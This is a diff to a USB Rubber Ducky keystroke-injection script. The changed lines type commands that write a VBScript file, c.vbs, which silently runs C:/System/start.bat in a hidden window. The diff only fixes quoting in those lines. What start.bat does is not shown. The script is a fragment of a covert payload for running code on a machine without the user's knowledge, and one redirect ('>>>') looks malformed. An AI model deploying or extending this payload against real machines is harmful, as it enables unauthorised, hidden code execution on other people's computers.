@@ -16,10 +16,10 @@
   ENTER
   DELAY 100
   REM [creates three lines of commands in a script file telling the start.bat file to run in the background]
-  STRING echo Set WshShell = CreateObject('WScript.Shell') > c.vbs
+  STRING echo Set WshShell = CreateObject("WScript.Shell") > c.vbs
   ENTER
   DELAY 100
-  STRING echo WshShell.Run chr(34) ^& C:/System/start.bat ^& Chr(34), 0 >> c.vbs
+  STRING echo WshShell.Run chr(34) ^& "C:/System/start.bat" ^& Chr(34), 0 >> c.vbs
   ENTER
   DELAY 50
   STRING echo Set WshShell = Nothing >>> c.vbs
